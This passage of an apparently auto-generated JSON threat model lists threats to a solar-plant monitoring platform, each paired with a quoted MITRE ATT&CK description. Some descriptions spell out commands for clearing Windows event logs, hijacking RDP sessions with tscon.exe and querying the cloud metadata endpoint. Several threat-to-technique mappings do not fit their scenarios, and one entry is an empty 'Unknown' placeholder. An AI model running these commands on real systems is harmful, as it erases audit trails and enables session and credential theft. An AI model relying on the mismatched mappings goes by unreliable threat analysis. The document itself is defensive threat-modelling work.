doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the TOREADOR platform and modifies AI/ML model parameters.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has valid credentials or finds a way to bypass authentication.",
                    "Role": "Advanced persistent threat (APT) or compromised user",
                    "Condition": "Weak authentication controls or exploited software vulnerabilities."
                },
                {
                    "Assumption": "Insufficient logging and monitoring of changes in the TOREADOR platform.",
                    "Role": "Admin with logging policy oversight",
                    "Condition": "Lack of audit trails for configuration changes."
                }
            ],
            "Potential Impact": "Compromise of data integrity and availability, potentially leading to system-wide disruptions.",
            "MITRE ATT&CK Keywords": [
                "Model Tampering",
                "Configuration Manipulation",
                "Cloud Platform",
                "Credential Access"
            ],
            "mitre_technique": {
                "name": "Exploits",
                "description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
                "id": "attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2",
                "technique_id": "T1587.004"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware injection into the Receiver to alter the data processing workflow.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can deliver malware via known or unknown vulnerabilities.",
                    "Role": "External malicious actor",
                    "Condition": "Unpatched vulnerabilities in the Receiver software."
                },
                {
                    "Assumption": "Inadequate malware detection or intrusion prevention systems in place.",
                    "Role": "Security administrators",
                    "Condition": "Lack of sufficient defensive measures and monitoring."
                }
            ],
            "Potential Impact": "Data integrity and availability are impacted due to altered data processing and potential system crashes.",
            "MITRE ATT&CK Keywords": [
                "Malware Injection",
                "Data Corruption",
                "Network",
                "Process Injection"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes logs from the TOREADOR platform to hide their malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained administrative privileges.",
                    "Role": "Compromised account with admin rights",
                    "Condition": "Weak administrative access controls."
                },
                {
                    "Assumption": "The system lacks immutable logging mechanisms.",
                    "Role": "System architect",
                    "Condition": "Logs are not protected from tampering or deletion."
                }
            ],
            "Potential Impact": "Inability to investigate and attribute the malicious activity, leading to challenges in restoring data integrity and improving security.",
            "MITRE ATT&CK Keywords": [
                "Log Deletion",
                "Admin Account Compromise",
                "Cloud Platform",
                "Logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making changes to the ML model configurations in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user activities and changes in the platform.",
                    "Role": "Compliance auditor",
                    "Condition": "Detailed activity logs are not maintained."
                },
                {
                    "Assumption": "The system lacks non-repudiation controls (e.g., digital signatures).",
                    "Role": "System architect",
                    "Condition": "Changes are not cryptographically signed."
                }
            ],
            "Potential Impact": "Confusion and misinformation regarding model integrity and the underlying data, potentially disrupting operations.",
            "MITRE ATT&CK Keywords": [
                "User Action Denial",
                "Configuration Changes",
                "Cloud Platform",
                "Audit Logs"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims their actions that led to a system failure were the result of a mistaken identity.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate authentication mechanisms that allow for misuse or shared accounts.",
                    "Role": "User and IT administrator",
                    "Condition": "Shared accounts or weak identification methods."
                },
                {
                    "Assumption": "Lack of detailed user session tracking.",
                    "Role": "System administrator",
                    "Condition": "No session logging or monitoring capabilities."
                }
            ],
            "Potential Impact": "Difficulty in accountability and remediation of issues, leading to unresolved security incidents.",
            "MITRE ATT&CK Keywords": [
                "Session Hijacking",
                "User Accountability",
                "Access Controls",
                "Cloud Platform"
            ],
            "mitre_technique": {
                "name": "Remote Desktop Protocol",
                "description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)",
                "id": "attack-pattern--51dea151-0898-4a45-967c-3ebee0420484",
                "technique_id": "T1076"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leakage during data transfer from the Data Logger to the Receiver due to inadequate encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "Data Logger and Receiver",
                    "Condition": "No encryption mechanisms such as TLS in place."
                },
                {
                    "Assumption": "Sensitive information is transmitted over a vulnerable network channel.",
                    "Role": "Network administrator",
                    "Condition": "Insufficient network security measures."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data leading to confidentiality breaches and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "Data Leakage",
                "Unencrypted Data",
                "Network Eavesdropping",
                "Sensitive Information"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Alternative Protocol",
                "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
                "id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
                "technique_id": "T1048"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to metadata containing sensitive information about the solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are poorly defined or enforced.",
                    "Role": "IT security team",
                    "Condition": "Misconfigured access control lists or permissions."
                },
                {
                    "Assumption": "Sensitive metadata is stored without adequate protection.",
                    "Role": "Database administrator",
                    "Condition": "Lack of encryption or access controls at the database level."
                }
            ],
            "Potential Impact": "Leakage of sensitive information such as location, operational status, and ownership details, impacting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Sensitive Metadata",
                "Access Controls",
                "Database",
                "Information Exposure"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the Anonymity Agent and obtains pre-processed unmasked data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient segregation of duties and access control.",
                    "Role": "System administrator",
                    "Condition": "Inadequate role-based access control."
                },
                {
                    "Assumption": "Pre-processed data lacks sufficient protection before anonymization.",
                    "Role": "Data engineer",
                    "Condition": "Data at rest is not encrypted."
                }
            ],
            "Potential Impact": "Exposure of sensitive raw data compromising confidentiality and potentially impacting privacy regulations.",
            "MITRE ATT&CK Keywords": [
                "Unauthorized Access",
                "Sensitive Data",
                "Pre-Processed Data",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the cloud-based TOREADOR platform, disrupting ML model training and predictions.",
            "Assumptions": [
                {
                    "Assumption": "The TOREADOR platform is publicly accessible over the internet.",
                    "Role": "Malicious external actor",
                    "Condition": "Internet-facing cloud services with known IPs."
                },
                {
                    "Assumption": "Insufficient DDoS protection mechanisms in place.",
                    "Role": "Cybersecurity team",
                    "Condition": "Lack of DDoS mitigation strategies such as rate limiting or traffic filtering."
                }
            ],
            "Potential Impact": "Disruption in the availability of ML model training and prediction functionalities, impacting maintenance and optimization tasks.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Service Disruption",
                "Cloud Platform",
                "Internet-Facing"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects the Data Logger, causing it to crash or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger\u2019s software has vulnerabilities that can be exploited by malware.",
                    "Role": "Malicious actor",
                    "Condition": "Unpatched software or lack of malware protection."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms for the Data Logger.",
                    "Role": "IT infrastructure team",
                    "Condition": "Single points of failure in the architecture."
                }
            ],
            "Potential Impact": "Loss of data collection functionality leading to system availability issues and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "Malware",
                "System Crash",
                "Data Logger",
                "Service Availability"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider deliberately overloads the Dashboard with excessive requests, rendering it unusable.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate monitoring and rate limiting on the Dashboard.",
                    "Role": "System developer",
                    "Condition": "No request limits or monitoring thresholds set."
                },
                {
                    "Assumption": "The attacker has access credentials to the Dashboard.",
                    "Role": "Insider threat",
                    "Condition": "No user behavior monitoring or anomaly detection in place."
                }
            ],
            "Potential Impact": "Disruption in availability and usability of the Dashboard, hindering operational monitoring and decision-making.",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Request Flooding",
                "Service Disruption",
                "Dashboard"
            ],
            "mitre_technique": {
                "name": "Deploy Container",
                "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",
                "id": "attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92",
                "technique_id": "T1610"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the Data Logger\u2019s firmware to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The firmware contains exploitable vulnerabilities.",
                    "Role": "Malicious attacker with technical skills",
                    "Condition": "Unpatched firmware or lack of security updates."
                },
                {
                    "Assumption": "The attacker has physical access or network access to initiate the attack.",
                    "Role": "Physical or network-based attacker",
                    "Condition": "Insufficient physical security or network segmentation."
                }
            ],
            "Potential Impact": "Attackers gaining full control over the Data Logger, leading to potential manipulation of sensor data and undermining system integrity.",
            "MITRE ATT&CK Keywords": [
                "Firmware Exploit",
                "Admin Privilege",
                "Data Logger",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "AS-REP Roasting",
                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
                "technique_id": "T1558.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a Zero-Day vulnerability in the TOREADOR platform to gain higher access levels.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is aware of and can exploit the Zero-Day vulnerability.",
                    "Role": "Advanced persistent threat (APT)",
                    "Condition": "Publicly known or discovered vulnerability with no patch available."
                },
                {
                    "Assumption": "Insufficient monitoring and anomaly detection within the TOREADOR platform.",
                    "Role": "System security team",
                    "Condition": "Lack of advanced threat detection mechanisms."
                }
            ],
            "Potential Impact": "Compromise of platform integrity, unauthorized data access, and potential service disruptions.",
            "MITRE ATT&CK Keywords": [
                "Zero-Day Exploit",
                "Privilege Escalation",
                "Cloud Platform",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--49f9e9bf23fe",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses their granted privileges to perform unauthorized actions outside their role scope.",
            "Assumptions": [
                {
                    "Assumption": "User roles and permissions are not strictly enforced.",
                    "Role": "System administrator",
                    "Condition": "Lack of fine-grained access control policies."
                },
                {
                    "Assumption": "No real-time monitoring or auditing of privileged user activities.",
                    "Role": "Cybersecurity team",
                    "Condition": "No user activity logs or alerts for abnormal actions."
                }
            ],
            "Potential Impact": "Misuse of administrative functions leading to data integrity compromises and potential system disruptions.",
            "MITRE ATT&CK Keywords": [
                "Insider Misuse",
                "Privilege Misuse",
                "Access Control",
                "Unauthorized Actions"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Impersonation of a Data Logger device to send false data to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain physical access to the power station site.",
                    "Role": "Attacker",
                    "Condition": "Physical security at the site is compromised."
                },
                {
                    "Assumption": "The attacker can successfully replicate the Data Logger\u2019s network credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are not securely stored."
                },
                {
                    "Assumption": "The system does not verify the identity of devices beyond initial setup.",
                    "Role": "System Architect",
                    "Condition": "Lack of ongoing authentication mechanisms."
                }
            ],
            "Potential Impact": "May lead to corrupted data and misinformed maintenance decisions, impacting integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "device",
                "spoofing",
                "credential access",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Impersonation of a user in the Dashboard interface to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Users do not use multi-factor authentication.",
                    "Role": "System User",
                    "Condition": "Single-factor authentication mechanisms."
                },
                {
                    "Assumption": "The attacker has access to a user's credential data.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials through phishing or another attack."
                },
                {
                    "Assumption": "Insufficient monitoring and logging of login activities.",
                    "Role": "System Administrator",
                    "Condition": "Lack of detailed access logs."
                }
            ],
            "Potential Impact": "Unauthorised access to sensitive operational data impacting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "user impersonation",
                "account access",
                "dashboard",
                "network"
            ],
